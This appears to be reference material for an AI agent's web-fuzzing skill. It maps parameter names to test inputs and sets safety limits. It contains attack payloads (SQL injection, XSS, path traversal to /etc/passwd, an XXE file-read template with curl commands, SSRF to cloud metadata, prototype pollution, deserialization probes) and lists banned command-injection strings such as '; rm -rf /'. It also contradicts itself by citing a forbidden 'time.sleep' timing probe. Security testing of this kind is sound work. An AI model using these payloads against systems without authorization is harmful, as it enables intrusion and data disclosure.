# Fuzz Strategies by Parameter Category

Use this table when generating corpus values for each fuzz target. Match the parameter name
against the "Name signals" column. When a parameter matches multiple categories, generate inputs
for all matching categories — they compound and that's intentional.

When a parameter name doesn't match any category, use the **Unmatched** fallback set at the bottom.

---

## Safety Constraints (Non-Negotiable)

These apply to every value in every corpus file, no exceptions:

**No write-operation SQL.** SQL injection probes must be read-only. Permitted: `SELECT`,
`UNION SELECT`, `OR 1=1`, `AND 1=2`, comment terminators (`--`, `#`, `/**/`). Prohibited in
any form: `INSERT`, `UPDATE`, `DELETE`, `DROP`, `TRUNCATE`, `ALTER`, `CREATE`, `EXEC`,
`EXECUTE`, `xp_cmdshell`, `INTO OUTFILE`, `LOAD_FILE`. A vulnerable application would execute
these against a real database — data loss and corruption are irreversible.

**No time-delay SQL.** Exclude `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`, `BENCHMARK()`, and
equivalent timing functions from SQL injection payloads. These probe blind injection via latency
but risk triggering a denial-of-service condition on shared infrastructure.

**No destructive deserialization payloads.** Deserialization probes must use known-safe classes
(`datetime.date`, `stdClass`, `System.Uri`) that verify the sink exists without executing
arbitrary code. Never include classes that invoke shell commands, file operations, or network
calls (e.g. no `os.system`, `subprocess`, `Runtime.exec`, `ProcessBuilder`).

**No command injection payloads.** Do not include shell metacharacters intended to execute
commands: backtick execution (`` `id` ``), `$(id)`, `; rm -rf /`, `| cat /etc/passwd`.
Command injection detection is out of scope for this skill — it requires controlled output
comparison that HTTP response fuzzing cannot provide safely.

If the user explicitly asks to add any of the above categories anyway, decline and explain that
the risk of accidental data loss or service disruption is not acceptable in an automated fuzz run.

---

## Semantic Category Table

| Category | Name signals | Generated inputs |
|---|---|---|
| **Numeric ID** | `id`, `*_id`, `user_id`, `account_id`, `item_id`, `record_id`, `*Id`, `*ID` | `0`, `-1`, `-2147483648`, `2147483648`, `9999999999`, `1.5`, `null`, `""`, `undefined`, `NaN`, `1 OR 1=1--`, `1 AND 1=2--`, `1 UNION SELECT NULL--`, `1 UNION SELECT NULL,NULL--`, `1 UNION SELECT NULL,NULL,NULL--`, `'`, `1'` |
| **Email address** | `email`, `email_address`, `login`, `username`, `*_email` | `user@`, `@example.com`, `user@@example.com`, `user @example.com`, `a@b.c'--`, `admin@example.com`, `"><script>alert(1)</script>@x.com`, (246-char `a` string + `@x.com`), `user+test@example.com`, `user@bücher.de` |
| **Password / secret** | `password`, `passwd`, `secret`, `pass`, `pwd`, `*_password`, `*_secret` | `""`, `null`, `password`, `admin`, `' OR '1'='1`, `'; SELECT * FROM users; --`, (256-char `a` string), `\x00`, `password\nX-Injected: true` |
| **Date / time** | `date`, `*_date`, `*_at`, `created_at`, `updated_at`, `timestamp`, `start`, `end`, `from`, `to`, `expires` | `0`, `-1`, `2038-01-19`, `9999-12-31`, `0000-00-00`, `13/32/2024`, `now`, `yesterday`, `1' OR '1'='1`, `2024-02-30`, `9999999999` (Unix epoch far future), `2024-01-01T00:00:00Z` |
| **Role / permission** | `role`, `roles`, `permission`, `permissions`, `scope`, `access`, `access_level`, `privilege`, `type`, `account_type` | `admin`, `root`, `superuser`, `administrator`, `ADMIN`, `Admin`, `system`, `internal`, `owner`, `god`, `sudo`, `staff`, `moderator`, `super_admin`, `null`, `""` |
| **Filename / path** | `file`, `filename`, `file_name`, `path`, `filepath`, `file_path`, `attachment`, `document`, `resource`, `uri`, `location` | `../../../etc/passwd`, `....//....//etc/passwd`, `/etc/passwd`, `/etc/passwd%00.jpg`, `%2e%2e%2f%2e%2e%2fetc%2fpasswd`, `CON`, `NUL`, `PRN`, `AUX`, `.htaccess`, `index.php`, `web.config`, `app.config`, `null`, `""`, (256-char `a` string) |
| **URL / redirect** | `url`, `redirect`, `redirect_url`, `return_url`, `callback`, `next`, `dest`, `destination`, `ref`, `referrer` | `http://attacker.com`, `//attacker.com`, `/\attacker.com`, `javascript:alert(1)`, `data:text/html,<h1>x</h1>`, `http://localhost/admin`, `http://169.254.169.254/latest/meta-data/`, `""`, `null` |
| **Free text / name** | `name`, `title`, `description`, `comment`, `message`, `content`, `body`, `text`, `label`, `note`, `subject` | `""`, `a`, (256-char `a` string), (1024-char `a` string — the one oversized probe), `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `' OR 1=1--`, `\x00`, `\r\nX-Injected: true`, `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` |
| **Token / key / hash** | `token`, `api_key`, `apikey`, `key`, `hash`, `nonce`, `auth`, `jwt`, `bearer`, `access_token`, `refresh_token` | `""`, `null`, `0000000000000000000000000000000000000000`, `aaaa`, (4-char `a` string), (256-char `a` string), `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.` (JWT with alg:none), `../../../etc/passwd` |
| **Boolean flag** | `enabled`, `active`, `is_admin`, `is_staff`, `verified`, `confirmed`, `flag`, `*_enabled`, `*_active`, `*_flag` | `true`, `false`, `1`, `0`, `"true"`, `"false"`, `"yes"`, `"no"`, `null`, `""`, `2`, `-1` |
| **Amount / quantity** | `amount`, `price`, `quantity`, `count`, `total`, `balance`, `fee`, `cost`, `rate`, `limit`, `offset` | `0`, `-1`, `-0.01`, `0.001`, `2147483647`, `9999999999.99`, `"NaN"`, `"Infinity"`, `"-Infinity"`, `null`, `""`, `1e308` |
| **Age / size / length** | `age`, `size`, `length`, `width`, `height`, `max`, `min`, `duration`, `timeout`, `retry` | `0`, `-1`, `2147483647`, `99999`, `1.5`, `"0"`, `null`, `""`, `"unlimited"` |
| **Search / query** | `query`, `q`, `search`, `filter`, `keyword`, `term`, `s` | `""`, `*`, `%`, `_`, `' OR 1=1--`, `"; SELECT * FROM users; --`, `<script>alert(1)</script>`, `{{7*7}}`, (256-char `a` string), `\x00` |
| **JSON string** | `data`, `payload`, `body`, `object`, `config`, `options`, `settings`, `params`, `args`, `input`, `value`, `json`, `*_json`, `*_data`, `*_payload` | `{}`, `[]`, `""`, `null`, `{"__proto__":{"polluted":"yes"}}`, `{"constructor":{"prototype":{"polluted":"yes"}}}`, `{"py/object":"datetime.date","year":2025,"month":1,"day":1}`, `{"$type":"System.Uri, System","UriString":"http://example.com"}`, `{"__type":"System.Object"}`, `O:8:"stdClass":0:{}`, `b:1;` |

---

## Encoding Variation Probes

Beyond mutating individual parameter values, probe whether the endpoint accepts alternative
body encodings. Servers that accept multiple Content-Types without strict enforcement may
inadvertently expose different attack surfaces depending on the format:

- A JSON endpoint that also accepts XML may have an XML parser with external entities enabled
  — an XXE vulnerability that's unreachable through the JSON path
- An endpoint that only exposes a flat form-encoded interface may accept JSON, exposing
  nested object and array inputs that form fields can't represent (prototype pollution,
  type confusion, secondary deserializer sinks)
- Switching from JSON to form-encoded may bypass JSON schema validation applied only to
  the structured path

### Encoding Variation Table

| Original `body_format` | Alternative to probe | Specific concern |
|---|---|---|
| `json` | `application/xml` + XXE probe | XXE if XML parser resolves external entities |
| `json` | `application/x-www-form-urlencoded` | May bypass JSON schema validation; different coercion |
| `json` | `multipart/form-data` | May expose file upload handling or bypass CSRF enforcement |
| `form` | `application/json` | JSON allows nested objects — prototype pollution, type confusion, secondary deserializer sinks |
| `form` | `application/xml` + XXE probe | XXE |
| `xml` | `application/json` | May bypass XML-specific validation or input sanitization |
| `text/plain` | `application/json`, `application/xml` + XXE probe | Server may auto-detect and attempt to parse as structured data |

Skip alternatives only when the body contains exclusively binary or file upload fields that
cannot be represented in the target encoding. If there is at least one text parameter, the
probe can always be constructed.

### XXE Probe Template

When probing an XML alternative, always inject a DOCTYPE external entity reference.
Use the first fuzzable body parameter as the entity reference insertion point:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><PARAM_NAME>&xxe;</PARAM_NAME></root>
```

A response that echoes `root:x:0:0` or similar file content confirms XXE. A 200 response
with any body change, or an error mentioning `entity`, `DOCTYPE`, or `DTD`, is a strong
candidate anomaly.

### Constructing the Probes

Re-encode all baseline body parameters in the target format with values **unchanged** from
the original baseline — the encoding change must be the only variable. Run each probe as
a curl command via the Bash tool.

**JSON → form-encoded**:
```bash
# Original: {"email": "user@example.com", "role": "member", "age": 25}
curl -s -X POST <url> \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=user%40example.com&role=member&age=25"
```

**JSON → XML with XXE probe**:
```bash
curl -s -X POST <url> \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><email>&xxe;</email><role>member</role><age>25</age></request>'
```

### What Counts as a Finding

Any of these is reportable:
- Server returns 2xx for an alternative encoding — unexpected content negotiation is itself
  a finding, regardless of whether a deeper vulnerability is exploited
- Status code differs from baseline
- Response body echoes file path content (XXE confirmed)
- Body contains parser error signals from the alternative format
- Response Content-Type changes

---

## Unmatched Parameters

When a parameter doesn't match any category above, generate this broad set:

```
(empty string)
null
undefined
true
false
0
-1
2147483648
' OR 1=1--
<script>alert(1)</script>
{{7*7}}
(256-char 'a' string)
../../../etc/passwd
\r\nX-Injected: true
\x00
```

---

## Generation Guidance

**Match on substrings**: `user_id` matches "Numeric ID" even though it's not just `id`.
The `*` wildcard in name signals means "any prefix/suffix".

**Context matters**: Read the current value alongside the name. A field named `type` with value
`"json"` probably controls output format — add `xml`, `html`, `csv`, `yaml`, `../` alongside
the standard role-escalation probes.

**Nested JSON bodies**: If a body param's type is `object` or `array`, include the scalar fuzz
inputs for that top-level key (the fuzzer replaces the entire value). This catches type-confusion
bugs where the server expects an object but receives a string. Also apply the **JSON string**
category probes to object/array parameters — a field typed as an object that is internally
re-serialized and passed to a secondary deserializer is a common unsafe deserialization pattern.

**Unsafe deserialization**: When a parameter matches the **JSON string** category (or when the
baseline value is a JSON string embedded inside a JSON string — i.e., a double-encoded value),
generate platform-specific deserialization probes in addition to the standard inputs:

- **Node.js prototype pollution** — target any endpoint backed by a deep-merge or
  `Object.assign()` call. Include `__proto__` and `constructor.prototype` keys at the top level
  and nested inside objects. A successful pollution attempt may show up as unexpected properties
  reflected in subsequent responses, or as a change in response headers:
  ```
  {"__proto__":{"polluted":"yes"}}
  {"constructor":{"prototype":{"polluted":"yes"}}}
  {"a":{"b":{"__proto__":{"polluted":"yes"}}}}
  ```

- **Python (jsonpickle)** — jsonpickle uses `py/object`, `py/reduce`, and `py/function` keys to
  instantiate arbitrary Python objects. Sending a safe known class (`datetime.date`) probes
  whether the endpoint calls `jsonpickle.decode()`. A 500 error mentioning `jsonpickle`,
  `cannot restore`, or an `AttributeError` referencing an unexpected module confirms the sink:
  ```
  {"py/object":"datetime.date","year":2025,"month":1,"day":1}
  {"py/object":"__main__.Nonexistent"}
  ```

- **ASP.NET (Json.NET `TypeNameHandling`)** — when `TypeNameHandling` is set to any value other
  than `None`, Json.NET resolves the `$type` key to a .NET type and instantiates it. Sending an
  invalid type name triggers a `JsonSerializationException` with the message
  `"Could not load type"` or `"Type specified in JSON ... was not resolved"` — either confirms
  the vulnerable setting. Legacy `JavaScriptSerializer` uses `__type` instead:
  ```
  {"$type":"INVALID_TYPE_DOES_NOT_EXIST"}
  {"$type":"System.Uri, System","UriString":"http://example.com"}
  {"__type":"System.Object"}
  ```

- **PHP (`unserialize()` on a JSON-decoded field)** — PHP serialized strings embedded as JSON
  string values indicate the server is calling `unserialize()` on the decoded field. `stdClass`
  is always available; a truncated payload triggers `"unserialize(): Error at offset"` directly
  in the response body if error reporting is on:
  ```
  O:8:"stdClass":0:{}
  b:1;
  O:1:
  ```

Classify any of the following response signals as an anomaly when these probes are used:
- Body contains `jsonpickle`, `cannot restore`, `py/object`, `py/reduce` (Python)
- Body contains `unserialize(): Error`, `Class 'X' not found` (PHP)
- Body contains `Could not load type`, `JsonSerializationException`, `TypeNameHandling` (ASP.NET)
- A subsequent baseline request shows unexpected properties or header values (Node.js pollution)
- Response time > 5s when using `{"py/object":"time.sleep","args":[5]}` style probes (timing)

**Line length limit — 256 characters maximum.** No single corpus value may exceed 256 characters.
This covers every common field-length validation boundary (VARCHAR(255), 128-char limits, etc.)
without burning output tokens on giant strings. The one exception is the free-text category,
which includes a single 1024-char probe to catch completely unvalidated fields — that is the
only value that may exceed 256 chars, and only in that category.

**Corpus file format**: Write one value per line. Blank lines are ignored by the fuzzer. Values
that would be JSON non-strings (numbers, booleans, null) are written as their raw literal —
the fuzzer injects them preserving the original field's JSON type context unless the original
type was a string.

---

## Why semantic fuzzing beats blind mutation

Blind fuzzing sends random garbage and relies on volume. Semantic fuzzing sends values that probe
specific server-side assumptions: "is this field validated as an email?", "does the server
parameterize SQL queries?", "does it restrict which roles a user can assign themselves?".
Fewer requests, higher signal-to-noise ratio — which is exactly what makes the anomaly detection
meaningful rather than overwhelming.
